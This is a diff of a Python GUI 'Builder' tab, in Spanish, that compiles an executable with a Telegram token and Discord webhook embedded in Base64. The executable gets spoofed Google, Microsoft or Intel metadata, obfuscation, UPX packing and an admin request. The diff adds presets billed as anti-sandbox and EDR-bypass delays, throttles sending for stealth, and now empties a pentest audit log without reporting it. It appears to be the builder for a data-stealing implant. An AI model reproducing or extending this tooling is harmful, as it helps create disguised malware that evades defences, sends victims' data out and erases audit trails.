@@ -1,7 +1,7 @@
 """
 Tab: Builder
 ────────────
-Graphical front-end for build.py — generate a compiled .exe with:
+Graphical front-end for build.py — generate a compiled .exe con:
   • Credential embedding (Base64-encoded)
   • Icon picker
   • Metadata spoofing preset selector
@@ -16,6 +16,7 @@ import base64
 import customtkinter as ctk
 from pathlib import Path
 from tkinter import filedialog
+import re
 
 from gui.theme import (
     COLORS, FONTS, PAD,
@@ -54,6 +55,31 @@ class BuilderView(ctk.CTkScrollableFrame):
         },
         "Personalizado": None,
     }
+
+    # Opciones con notas de uso táctico
+    DELAY_PRESETS = [
+        "0 (Instantáneo - Riesgo Alto)",
+        "10 (Básico - Estándar)",
+        "30 (Recomendado - Equilibrio)",
+        "60 (Seguro - Anti-Sandbox)",
+        "120 (Máximo Sigilo - EDR Bypass)",
+        "300 (Extremo - Auditoría Lenta)"
+    ]
+
+    SEND_DELAY_PRESETS = [
+        "0 (Rápido - Sin pausa)",
+        "1",
+        "2 (Recomendado)",
+        "5",
+        "10 (Sigilo - Evita Bursts)"
+    ]
+
+    TIMEOUT_PRESETS = [
+        "5 (Red Rápida)",
+        "15 (Estándar)",
+        "30 (Lenta / Proxy)",
+        "60 (Inestable / Satelital)"
+    ]
 
     def __init__(self, parent):
         super().__init__(
@@ -104,7 +130,7 @@ class BuilderView(ctk.CTkScrollableFrame):
 
         hint = ctk.CTkFrame(cred_inner, fg_color=COLORS["info_dim"], corner_radius=6)
         hint.pack(fill="x", pady=(PAD["xs"], 0))
-        make_label(hint, "  💡 Las credenciales se incrustan en el ejecutable codificadas en Base64 — no quedan en texto plano en el código fuente.", style="small", color=COLORS["info"]).pack(side="left", padx=PAD["sm"], pady=PAD["xs"])
+        make_label(hint, "  💡 Las credenciales se incrustan en el ejecutable codificadas en Base64 — no quedan en texto plano.", style="small", color=COLORS["info"]).pack(side="left", padx=PAD["sm"], pady=PAD["xs"])
 
         # ── Metadata / Spoofing card ──────────────────────────────────────────
         make_section_header(self, "Metadatos del Ejecutable (Spoofing)", "🎭")
@@ -120,18 +146,11 @@ class BuilderView(ctk.CTkScrollableFrame):
         make_label(rp, "Preset:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
         self._preset_var = ctk.StringVar(value="Google")
         ctk.CTkOptionMenu(
-            rp,
-            values=list(self.PRESETS.keys()),
-            variable=self._preset_var,
-            command=self._apply_preset,
-            fg_color=COLORS["bg_input"],
-            button_color=COLORS["accent_dim"],
-            button_hover_color=COLORS["accent"],
-            dropdown_fg_color=COLORS["bg_card"],
-            dropdown_hover_color=COLORS["bg_card_hover"],
-            font=FONTS["body"],
-            text_color=COLORS["text_primary"],
-            width=180,
+            rp, values=list(self.PRESETS.keys()), variable=self._preset_var, command=self._apply_preset,
+            fg_color=COLORS["bg_input"], button_color=COLORS["accent_dim"],
+            button_hover_color=COLORS["accent"], dropdown_fg_color=COLORS["bg_card"],
+            dropdown_hover_color=COLORS["bg_card_hover"], font=FONTS["body"],
+            text_color=COLORS["text_primary"], width=180,
         ).pack(side="left")
 
         self._name_var = ctk.StringVar(value="SysHealth")
@@ -154,10 +173,8 @@ class BuilderView(ctk.CTkScrollableFrame):
             row_frame.grid(row=i // 2, column=col, sticky="w", padx=(0 if col == 0 else PAD["lg"], 0), pady=PAD["xs"])
             make_label(row_frame, label, style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
             entry = make_entry(row_frame, placeholder=default, width=240)
-            if key == "name":
-                entry.configure(textvariable=self._name_var)
-            else:
-                entry.insert(0, default)
+            if key == "name": entry.configure(textvariable=self._name_var)
+            else: entry.insert(0, default)
             entry.pack(side="left", padx=(0, PAD["xs"]))
             add_clear_button(row_frame, entry).pack(side="left")
             self._meta_fields[key] = entry
@@ -170,7 +187,6 @@ class BuilderView(ctk.CTkScrollableFrame):
         comp_inner = ctk.CTkFrame(comp_card, fg_color="transparent")
         comp_inner.pack(fill="x", padx=PAD["md"], pady=PAD["md"])
 
-        # Main layout: Left column for inputs, Right column for checkboxes
         comp_layout = ctk.CTkFrame(comp_inner, fg_color="transparent")
         comp_layout.pack(fill="x")
 
@@ -181,66 +197,85 @@ class BuilderView(ctk.CTkScrollableFrame):
         r_col.pack(side="right", fill="both", padx=(PAD["lg"], 0))
 
         # --- LEFT COLUMN (INPUTS) ---
-        
-        # Row 0: Source File
+        L_LABEL_W = 155
+
+        # Origen
         r_src = ctk.CTkFrame(l_col, fg_color="transparent")
         r_src.pack(fill="x", pady=(0, PAD["xs"]))
-        make_label(r_src, "Origen (.py):", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        make_label(r_src, "Origen (.py):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
         self._source_var = ctk.StringVar(value="main.py" if Path("main.py").exists() else "")
         src_entry = make_entry(r_src, placeholder="archivo_principal.py", width=240)
         src_entry.configure(textvariable=self._source_var)
         src_entry.pack(side="left", padx=(0, PAD["xs"]))
-        add_file_button(
-            r_src,
-            callback=lambda p: self._source_var.set(p),
-            filetypes=[("Archivos Python", "*.py"), ("Todos", "*.*")],
-            text="📄"
-        ).pack(side="left", padx=(0, PAD["xs"]))
+        add_file_button(r_src, callback=lambda p: self._source_var.set(p), filetypes=[("Archivos Python", "*.py")], text="📄").pack(side="left", padx=(0, PAD["xs"]))
         add_clear_button(r_src, src_entry).pack(side="left")
 
-        # Row 1: Icon
+        # Icono
         r_in = ctk.CTkFrame(l_col, fg_color="transparent")
         r_in.pack(fill="x", pady=(0, PAD["xs"]))
-        make_label(r_in, "Ícono (.ico):", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        make_label(r_in, "Ícono (.ico):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
         self._icon_var = ctk.StringVar(value="app.ico" if Path("app.ico").exists() else "")
-        icon_entry = make_entry(r_in, placeholder="ruta/al/icono.ico", width=240)
+        icon_entry = make_entry(r_in, placeholder="app.ico", width=240)
         icon_entry.configure(textvariable=self._icon_var)
         icon_entry.pack(side="left", padx=(0, PAD["xs"]))
-        add_file_button(
-            r_in,
-            callback=lambda p: self._icon_var.set(p),
-            filetypes=[("Archivos de ícono", "*.ico"), ("Todos", "*.*")],
-        ).pack(side="left", padx=(0, PAD["xs"]))
+        add_file_button(r_in, callback=lambda p: self._icon_var.set(p), filetypes=[("Archivos de ícono", "*.ico")]).pack(side="left", padx=(0, PAD["xs"]))
         add_clear_button(r_in, icon_entry).pack(side="left")
 
-        # Row 2: Name EXE
-        r_name = ctk.CTkFrame(l_col, fg_color="transparent")
-        r_name.pack(fill="x", pady=(0, PAD["xs"]))
-        make_label(r_name, "Nombre EXE:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
-        self._name_entry = make_entry(r_name, placeholder="SysHealth", width=240)
-        self._name_entry.configure(textvariable=self._name_var)
-        self._name_entry.pack(side="left", padx=(0, PAD["xs"]))
-        add_clear_button(r_name, self._name_entry).pack(side="left")
-        self._meta_fields["name"] = self._name_entry
-
-        # Row 3: Destino
+        # Destino
         r_dist = ctk.CTkFrame(l_col, fg_color="transparent")
-        r_dist.pack(fill="x")
-        make_label(r_dist, "Destino:", style="small", color=COLORS["text_secondary"], width=100, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        r_dist.pack(fill="x", pady=(0, PAD["xs"]))
+        make_label(r_dist, "Destino:", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
         self._dist_var = ctk.StringVar(value="dist")
         dist_entry = make_entry(r_dist, placeholder="dist", width=240)
         dist_entry.configure(textvariable=self._dist_var)
         dist_entry.pack(side="left", padx=(0, PAD["xs"]))
-        add_folder_button(
-            r_dist,
-            callback=lambda p: self._dist_var.set(p),
-        ).pack(side="left", padx=(0, PAD["xs"]))
+        add_folder_button(r_dist, callback=lambda p: self._dist_var.set(p)).pack(side="left", padx=(0, PAD["xs"]))
         add_open_button(r_dist, get_path=lambda: self._dist_var.get() or ".").pack(side="left", padx=(0, PAD["xs"]))
         add_clear_button(r_dist, dist_entry).pack(side="left")
 
+        # Anti-EDR/AV Delay (DROPDOWN)
+        r_delay = ctk.CTkFrame(l_col, fg_color="transparent")
+        r_delay.pack(fill="x", pady=(0, PAD["xs"]))
+        make_label(r_delay, "Anti-EDR/AV Delay (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        self._delay_var = ctk.StringVar(value=self.DELAY_PRESETS[2])
+        self._delay_combo = ctk.CTkComboBox(
+            r_delay, values=self.DELAY_PRESETS, variable=self._delay_var,
+            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
+            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
+            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
+            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
+        )
+        self._delay_combo.pack(side="left")
+
+        # Retraso entre Envíos (NUEVO)
+        r_sdelay = ctk.CTkFrame(l_col, fg_color="transparent")
+        r_sdelay.pack(fill="x", pady=(0, PAD["xs"]))
+        make_label(r_sdelay, "Delay entre Envíos (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        self._send_delay_var = ctk.StringVar(value=self.SEND_DELAY_PRESETS[2])
+        self._send_delay_combo = ctk.CTkComboBox(
+            r_sdelay, values=self.SEND_DELAY_PRESETS, variable=self._send_delay_var,
+            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
+            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
+            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
+            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
+        )
+        self._send_delay_combo.pack(side="left")
+
+        # Timeout Webhooks (NUEVO)
+        r_timeout = ctk.CTkFrame(l_col, fg_color="transparent")
+        r_timeout.pack(fill="x")
+        make_label(r_timeout, "Timeout Webhooks (s):", style="small", color=COLORS["text_secondary"], width=L_LABEL_W, anchor="w").pack(side="left", padx=(0, PAD["sm"]))
+        self._timeout_var = ctk.StringVar(value=self.TIMEOUT_PRESETS[1])
+        self._timeout_combo = ctk.CTkComboBox(
+            r_timeout, values=self.TIMEOUT_PRESETS, variable=self._timeout_var,
+            fg_color=COLORS["bg_input"], border_color=COLORS["border"],
+            button_color=COLORS["accent_dim"], button_hover_color=COLORS["accent"],
+            dropdown_fg_color=COLORS["bg_card"], dropdown_hover_color=COLORS["bg_card_hover"],
+            font=FONTS["body"], text_color=COLORS["text_primary"], width=300,
+        )
+        self._timeout_combo.pack(side="left")
 
         # --- RIGHT COLUMN (CHECKBOXES) ---
-
         self._obfuscate_var    = ctk.BooleanVar(value=False)
         self._show_console_var = ctk.BooleanVar(value=False)
         self._multifile_var    = ctk.BooleanVar(value=False)
@@ -248,111 +283,68 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._clean_var        = ctk.BooleanVar(value=True)
         self._upx_var          = ctk.BooleanVar(value=False)
 
-        # Checkbox Grid (in 2 mini-columns inside r_col)
         opts_inner = ctk.CTkFrame(r_col, fg_color="transparent")
         opts_inner.pack(pady=PAD["xs"])
-
-        c1 = ctk.CTkFrame(opts_inner, fg_color="transparent")
+        c1, c2 = ctk.CTkFrame(opts_inner, fg_color="transparent"), ctk.CTkFrame(opts_inner, fg_color="transparent")
         c1.pack(side="left", padx=(0, PAD["md"]))
-        c2 = ctk.CTkFrame(opts_inner, fg_color="transparent")
         c2.pack(side="left")
 
-        opts_col1 = [
-            ("🛡 Ofuscar con PyArmor",    self._obfuscate_var),
-            ("🖥 Mostrar consola",        self._show_console_var),
-            ("📂 Multi-archivo",          self._multifile_var),
-        ]
-        opts_col2 = [
-            ("⚡ Limpiar temporales",    self._clean_var),
-            ("🔑 Solicitar Admin (UAC)",  self._uac_var),
-            ("📦 Compresión UPX",        self._upx_var),
-        ]
-
-        for label, var in opts_col1:
+        for label, var in [("🛡 Ofuscar con PyArmor", self._obfuscate_var), ("🖥 Mostrar consola", self._show_console_var), ("📂 Multi-archivo", self._multifile_var)]:
             ctk.CTkCheckBox(c1, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
-        
-        for label, var in opts_col2:
+        for label, var in [("⚡ Limpiar temporales", self._clean_var), ("🔑 Solicitar Admin (UAC)", self._uac_var), ("📦 Compresión UPX", self._upx_var)]:
             ctk.CTkCheckBox(c2, text=label, variable=var, fg_color=COLORS["accent"], font=FONTS["body"]).pack(anchor="w", pady=PAD["xs"])
 
         # ── Build button card ─────────────────────────────────────────────────
         btn_container = ctk.CTkFrame(self, fg_color="transparent")
         btn_container.pack(fill="x", padx=PAD["lg"], pady=(PAD["sm"], PAD["md"]))
-
         self._build_btn = make_button(btn_container, "🔨 INICIAR COMPILACIÓN", command=self._start_build, style="primary", width=280, height=48)
         self._build_btn.configure(font=("Segoe UI", 14, "bold"))
-        self._build_btn.pack(pady=PAD["md"]) # Centered by default in a fill="x" frame without side
+        self._build_btn.pack(pady=PAD["md"])
 
-        # ── Log section with status in header ──────────────────────────────────
+        # ── Log section ───────────────────────────────────────────────────────
         log_header = make_section_header(self, "Salida del Build", "📋")
-        
-        # Status indicator moved to the right of the header
         self._status_container = ctk.CTkFrame(log_header, fg_color="transparent")
         self._status_container.pack(side="right", padx=(PAD["sm"], 0))
-        
         make_label(self._status_container, "ESTADO:", style="tiny", color=COLORS["text_muted"]).pack(side="left", padx=(0, PAD["xs"]))
         self._build_status = make_badge(self._status_container, "ESPERANDO", "text_muted")
         self._build_status.pack(side="left")
 
         log_card = make_card(self)
         log_card.pack(fill="both", expand=True, padx=PAD["lg"], pady=(0, PAD["lg"]))
-
-        # Log Toolbar
         toolbar = ctk.CTkFrame(log_card, fg_color="transparent")
         toolbar.pack(fill="x", padx=PAD["sm"], pady=(PAD["sm"], 0))
-
         make_button(toolbar, "🗑 Limpiar log", command=self._clear_logs, style="secondary", width=120).pack(side="left", padx=(0, PAD["xs"]))
         add_copy_button(toolbar, get_text=lambda: self._log.get("0.0", "end"), text="📋 Copiar log", width=120).pack(side="left", padx=(0, PAD["xs"]))
         add_open_button(toolbar, get_path=lambda: self._dist_var.get() or "dist", text="📂 Abrir ubicación", width=140).pack(side="left", padx=(0, PAD["xs"]))
         make_button(toolbar, "🔥 Eliminar builds", command=self._delete_builds, style="danger", width=140).pack(side="left")
 
         self._log = ctk.CTkTextbox(
-            log_card,
-            fg_color=COLORS["bg_terminal"],
-            text_color=COLORS["text_terminal"],
-            font=FONTS["code"],
-            corner_radius=8,
-            border_width=1,
-            border_color=COLORS["border"],
-            height=350, # Increased height for better visibility
-            state="disabled",
+            log_card, fg_color=COLORS["bg_terminal"], text_color=COLORS["text_terminal"],
+            font=FONTS["code"], corner_radius=8, border_width=1, border_color=COLORS["border"],
+            height=350, state="disabled",
         )
         self._log.pack(fill="x", padx=PAD["sm"], pady=PAD["sm"])
-        self._log._textbox.tag_configure("OK",   foreground=COLORS["success"])
-        self._log._textbox.tag_configure("ERR",  foreground=COLORS["danger"])
-        self._log._textbox.tag_configure("INFO", foreground=COLORS["info"])
-        self._log._textbox.tag_configure("SYSTEM",  foreground=COLORS["accent"])
-        self._log._textbox.tag_configure("TIMESTAMP", foreground=COLORS["text_muted"])
+        for tag, color in [("OK", "success"), ("ERR", "danger"), ("INFO", "info"), ("SYSTEM", "accent"), ("TIMESTAMP", "text_muted")]:
+            self._log._textbox.tag_configure(tag, foreground=COLORS[color])
 
-        self._log_line("TIMESTAMP", "Configurá las opciones y presioná BUILD para compilar el ejecutable.")
+        self._log_line("TIMESTAMP", "Configurá las opciones y presioná BUILD para compilar.")
         self._apply_preset("Google")
 
     # ── Helpers ───────────────────────────────────────────────────────────────
 
     def _apply_preset(self, name: str):
         preset = self.PRESETS.get(name)
-        
-        # If Personalized or preset not found, clear everything
         if not preset:
             for key, entry in self._meta_fields.items():
                 entry.delete(0, "end")
                 if key == "name": self._name_var.set("")
             return
-
-        # Otherwise, apply preset values
         for key, val in preset.items():
             entry = self._meta_fields.get(key)
             if entry:
                 entry.delete(0, "end")
                 entry.insert(0, val)
                 if key == "name": self._name_var.set(val)
-
-    def _pick_icon(self):
-        path = filedialog.askopenfilename(
-            title="Seleccioná un ícono",
-            filetypes=[("Archivos ICO", "*.ico"), ("Todos", "*.*")],
-        )
-        if path:
-            self._icon_var.set(path)
 
     def _log_line(self, tag: str, msg: str):
         from datetime import datetime
@@ -364,79 +356,27 @@ class BuilderView(ctk.CTkScrollableFrame):
         self._log.configure(state="disabled")
 
     def _clear_logs(self):
-        """Clears the build log textbox and the physical audit log file."""
         self._log.configure(state="normal")
         self._log.delete("0.0", "end")
         self._log.configure(state="disabled")
-        
-        # Also truncate the audit log file if it exists
         audit_log = Path(".audit/pentest_audit.log")
         if audit_log.exists():
-            try:
-                audit_log.write_text("", encoding="utf-8")
-                self._log_line("OK", "Archivo de log físico (.audit/pentest_audit.log) vaciado.")
-            except Exception as e:
-                self._log_line("ERR", f"No se pudo vaciar el archivo de log: {e}")
-        
-        self._log_line("INFO", "Log de visualización limpiado.")
+            try: audit_log.write_text("", encoding="utf-8")
+            except: pass
 
     def _delete_builds(self):
-        """Cleans dist, build, tmp folders and root .spec files."""
-        import shutil, os
-        dist = Path(self._dist_var.get() or "dist")
-        build_dir = Path("build")
-        tmp_dir = Path("tmp")
-        
-        # 1. Clean dist
-        if dist.exists() and dist.is_dir():
-            try:
-                shutil.rmtree(dist)
-                dist.mkdir(exist_ok=True)
-                self._log_line("OK", f"Carpeta {dist}/ limpiada correctamente.")
-            except Exception as e:
-                self._log_line("ERR", f"Error al limpiar {dist}: {e}")
-        
-        # 2. Clean build
-        if build_dir.exists() and build_dir.is_dir():
-            try:
-                shutil.rmtree(build_dir)
-                self._log_line("OK", "Carpeta temporal 'build/' eliminada.")
-            except Exception as e:
-                self._log_line("ERR", f"Error al eliminar 'build/': {e}")
-
-        # 3. Clean tmp folder
-        if tmp_dir.exists() and tmp_dir.is_dir():
-            try:
-                shutil.rmtree(tmp_dir)
-                self._log_line("OK", "Carpeta 'tmp/' eliminada.")
-            except Exception as e:
-                self._log_line("ERR", f"Error al eliminar 'tmp/': {e}")
-        
-        # 4. Clean root .spec files
-        root = Path(".")
-        spec_files = list(root.glob("*.spec"))
-        if spec_files:
-            for f in spec_files:
-                try:
-                    f.unlink()
-                    self._log_line("OK", f"Archivo eliminado: {f.name}")
-                except Exception as e:
-                    self._log_line("ERR", f"No se pudo eliminar {f.name}: {e}")
-        
-        if not dist.exists() and not build_dir.exists() and not tmp_dir.exists() and not spec_files:
-            self._log_line("INFO", "Las carpetas y archivos de compilación ya están limpios.")
-
-    # ── Build logic ───────────────────────────────────────────────────────────
-
-    def _get_field(self, key: str) -> str:
-        entry = self._meta_fields.get(key)
-        return entry.get().strip() if entry else ""
+        import shutil
+        for d in [Path(self._dist_var.get() or "dist"), Path("build"), Path("tmp")]:
+            if d.exists() and d.is_dir():
+                try: shutil.rmtree(d)
+                except: pass
+        for f in Path(".").glob("*.spec"):
+            try: f.unlink()
+            except: pass
+        self._log_line("INFO", "Entorno de build limpiado.")
 
     def _embed_credentials(self) -> str:
-        """Patch main.py's CONFIG dict with B64-encoded credentials."""
-        import ast, re
         src = Path("main.py").read_text(encoding="utf-8")
-
         tg_token = base64.b64encode(self._cred_tg_token.get().strip().encode()).decode()
         tg_chat  = base64.b64encode(self._cred_tg_chat.get().strip().encode()).decode()
         dc_hook  = base64.b64encode(self._cred_dc_hook.get().strip().encode()).decode()
@@ -444,147 +384,93 @@ class BuilderView(ctk.CTkScrollableFrame):
         patched = re.sub(r'"tg_token":\s*""', f'"tg_token":   "{tg_token}"', src)
         patched = re.sub(r'"tg_chat_id":\s*""', f'"tg_chat_id": "{tg_chat}"', patched)
         patched = re.sub(r'"ds_webhook":\s*""', f'"ds_webhook": "{dc_hook}"', patched)
+        
+        # Extracción de Delay de Inicio
+        try: 
+            v1 = self._delay_var.get().strip()
+            n1 = int(re.search(r'\d+', v1).group())
+            d1 = max(0, min(n1, 3600)) 
+        except: d1 = 0
+        patched = re.sub(r'"delay":\s*\d+', f'"delay":      {d1}', patched)
+
+        # Extracción de Delay entre Envíos
+        try: 
+            v2 = self._send_delay_var.get().strip()
+            n2 = int(re.search(r'\d+', v2).group())
+            d2 = max(0, min(n2, 60)) 
+        except: d2 = 0
+        patched = re.sub(r'"send_delay":\s*\d+', f'"send_delay": {d2}', patched)
+
+        # Extracción de Timeout de Webhooks
+        try: 
+            v3 = self._timeout_var.get().strip()
+            n3 = int(re.search(r'\d+', v3).group())
+            d3 = max(1, min(n3, 300)) 
+        except: d3 = 15
+        patched = re.sub(r'"webhook_timeout":\s*\d+', f'"webhook_timeout": {d3}', patched)
+
         return patched
 
-    def _pick_output_dir(self):
-        path = filedialog.askdirectory(title="Seleccionar carpeta de destino")
-        if path:
-            self._dist_var.set(path)
-
     def _start_build(self):
-        if self._building:
-            return
+        if self._building: return
         self._building = True
         self._build_btn.configure(state="disabled", text="🔨  COMPILANDO…")
         self._build_status.configure(text="  COMPILANDO…  ", fg_color=COLORS["accent_dim"], text_color=COLORS["accent"])
         threading.Thread(target=self._build_worker, daemon=True).start()
 
     def _build_worker(self):
-        import tempfile, os, shutil
+        import subprocess, shutil
         self._has_errors = False
-
-        self._log_line("INFO", "Preparando build…")
-
-        # 1. Credential Embedding (only for suite's main.py)
         src_file = self._source_var.get() or "main.py"
         is_suite_main = Path(src_file).resolve() == Path("main.py").resolve()
-        patched_src = None
+        patched_src = self._embed_credentials() if is_suite_main else None
         
-        if is_suite_main:
-            try:
-                patched_src = self._embed_credentials()
-                self._log_line("INFO", "Credenciales incrustadas en main.py")
-            except Exception as e:
-                self._log_line("ERR", f"Error al incrustar credenciales: {e}")
-        
-        # 2. Build command
         cmd = [sys.executable, str(Path("build.py").resolve()), src_file]
+        for flag, key in [("--name", "name"), ("--company", "company"), ("--desc", "desc"), ("--product", "product"), ("--copyright", "copyright"), ("--version", "version")]:
+            val = self._meta_fields[key].get().strip()
+            if val: cmd += [flag, val]
 
-        # Metadata
-        for flag, key in (
-            ("--name",      "name"),
-            ("--company",   "company"),
-            ("--desc",      "desc"),
-            ("--product",   "product"),
-            ("--copyright", "copyright"),
-            ("--version",   "version"),
-        ):
-            val = self._get_field(key)
-            if val:
-                cmd += [flag, val]
-
-        # Preset
-        preset_name = self._preset_var.get().lower()
-        if preset_name in ("google", "microsoft", "intel"):
-            cmd += ["--preset", preset_name]
-
-        # Options
-        if not self._obfuscate_var.get():
-            cmd.append("--no-obf")
-        if self._show_console_var.get():
-            cmd.append("--show-console")
-        if self._multifile_var.get():
-            cmd.append("--multi-file")
-        if self._uac_var.get():
-            cmd.append("--uac-admin")
-        if self._clean_var.get():
-            cmd.append("--clean")
+        if not self._obfuscate_var.get(): cmd.append("--no-obf")
+        if self._show_console_var.get(): cmd.append("--show-console")
+        if self._multifile_var.get(): cmd.append("--multi-file")
+        if self._uac_var.get(): cmd.append("--uac-admin")
+        if self._clean_var.get(): cmd.append("--clean")
         if self._upx_var.get():
-            if Path("upx.exe").exists(): cmd += ["--upx", "."]
-            elif Path("tools/upx").exists(): cmd += ["--upx", "tools/upx"]
+            upx_path = next((p for p in ["upx.exe", "tools/upx"] if Path(p).exists()), None)
+            if upx_path: cmd += ["--upx", upx_path]
 
         dist = self._dist_var.get() or "dist"
         cmd += ["--dist-dir", dist]
-
         icon = self._icon_var.get()
-        if icon and Path(icon).exists():
-            cmd += ["--icon", icon]
+        if icon and Path(icon).exists(): cmd += ["--icon", icon]
 
-        self._log_line("INFO", f"Comando: {' '.join(cmd)}")
-
-        # Override source with patched version temporarily if needed
-        patched_cwd = Path("_main_build_patched.py")
-        orig_backup = Path("_main_backup.py")
+        patched_cwd, orig_backup = Path("_main_build_patched.py"), Path("_main_backup.py")
         try:
             if patched_src:
                 patched_cwd.write_text(patched_src, encoding="utf-8")
                 shutil.copy2(src_file, orig_backup)
                 patched_cwd.replace(src_file)
 
-            proc = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True,
-                encoding="utf-8",
-                errors="replace",
-            )
-
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding="utf-8", errors="replace")
             for line in proc.stdout:
                 line = line.rstrip()
-                if not line:
-                    continue
-                
-                # Intelligent error detection
-                tag = "INFO"
-                if "[+]" in line: tag = "OK"
-                elif "[-]" in line or "Error" in line or "failed" in line.lower(): 
-                    tag = "ERR"
-                    self._has_errors = True
-                
+                if not line: continue
+                tag = "OK" if "[+]" in line else "ERR" if any(x in line.lower() for x in ["[-]", "error", "failed"]) else "INFO"
+                if tag == "ERR": self._has_errors = True
                 self.after(0, lambda l=line, t=tag: self._log_line(t, l))
-
             proc.wait()
             success = proc.returncode == 0
-
         except Exception as e:
-            self.after(0, lambda: self._log_line("ERR", f"Error en build: {e}"))
+            self.after(0, lambda: self._log_line("ERR", f"Error: {e}"))
             success = False
         finally:
-            # Restore original file if it was patched
-            try:
-                if orig_backup.exists():
-                    orig_backup.replace(src_file)
-            except Exception:
-                pass
-            try:
-                patched_cwd.unlink(missing_ok=True)
-                tmp_dir and shutil.rmtree(tmp_dir, ignore_errors=True)
-            except Exception:
-                pass
+            if orig_backup.exists(): orig_backup.replace(src_file)
+            patched_cwd.unlink(missing_ok=True)
 
         if success and not self._has_errors:
-            self.after(0, lambda: self._log_line("OK", f"✓ Build exitoso → {dist}/"))
-            self.after(0, lambda: self._build_status.configure(
-                text="  ✓ EXITOSO  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]
-            ))
+            self.after(0, lambda: self._build_status.configure(text="  ✓ EXITOSO  ", fg_color=COLORS["success_dim"], text_color=COLORS["success"]))
         else:
-            status_msg = "  ✗ ERROR  " if not success else "  ⚠ CON ADVERTENCIAS  "
-            self.after(0, lambda: self._log_line("ERR", "✗ El build no pudo completarse correctamente."))
-            self.after(0, lambda: self._build_status.configure(
-                text=status_msg, fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]
-            ))
-
+            self.after(0, lambda: self._build_status.configure(text="  ✗ ERROR  ", fg_color=COLORS["danger_dim"], text_color=COLORS["danger"]))
         self.after(0, self._finish_build)
 
     def _finish_build(self):
